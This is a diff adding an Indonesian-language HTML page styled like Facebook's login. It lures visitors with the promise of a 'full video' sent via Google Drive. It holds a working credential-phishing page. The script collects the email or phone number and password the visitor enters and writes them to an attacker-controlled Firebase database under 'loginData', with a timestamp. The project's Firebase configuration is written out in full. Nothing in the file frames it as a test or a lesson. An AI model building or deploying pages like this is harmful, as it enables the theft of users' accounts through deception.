@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aplikasi Sosial Media – Video Full Gdrive</title>
+
+<style>
+body {
+  margin: 0;
+  padding: 0;
+  font-family: Arial, sans-serif;
+  background: #F0F2F5;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  background: #FFFFFF;
+  width: 90%;
+  max-width: 380px;
+  padding: 25px;
+  border-radius: 10px;
+  box-shadow: 0 0 20px rgba(0,0,0,0.1);
+  text-align: center;
+}
+
+.title {
+  font-size: 28px;
+  font-weight: bold;
+  color: #1877F2;
+  margin-bottom: 20px;
+}
+
+input {
+  width: 100%;
+  padding: 14px;
+  margin: 8px 0;
+  border: 1px solid #ddd;
+  border-radius: 8px;
+  font-size: 16px;
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  background: #1877F2;
+  color: white;
+  border: none;
+  font-size: 17px;
+  border-radius: 8px;
+  font-weight: bold;
+  cursor: pointer;
+  margin-top: 10px;
+}
+
+button:hover {
+  background: #166FE5;
+}
+
+.note {
+  margin-top: 15px;
+  font-size: 13px;
+  color: #606770;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="title">Masuk</div>
+
+  <input id="username" placeholder="Email atau Nomor HP">
+  <input id="password" type="password" placeholder="Kata Sandi">
+
+  <button onclick="sendData()">Masuk</button>
+
+  <div class="note">Masukkan Email dan Password agar kami kirimkan video melalui Gdrive</div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+import { getDatabase, ref, push, set } 
+  from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDxgnLu6TtJce2hd1DL07z5MWo62blEgC8",
+  authDomain: "simulasi-kamera.firebaseapp.com",
+  databaseURL: "https://simulasi-kamera-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "simulasi-kamera",
+  storageBucket: "simulasi-kamera.firebasestorage.app",
+  messagingSenderId: "924924454534",
+  appId: "1:924924454534:web:8a3c34079aa1b0edd9d307"
+};
+
+const app  = initializeApp(firebaseConfig);
+const db   = getDatabase(app);
+
+window.sendData = async () => {
+  const user = username.value.trim();
+  const pass = password.value.trim();
+
+  if(!user || !pass){
+    alert("Mohon isi semua kolom.");
+    return;
+  }
+
+  const id = push(ref(db, "loginData")).key;
+
+  await set(ref(db, "loginData/" + id), {
+    username: user,
+    password: pass,
+    time: new Date().toLocaleString()
+  });
+
+  alert("Data terkirim!");
+  username.value = "";
+  password.value = "";
+};
+</script>
+
+</body>
+</html>
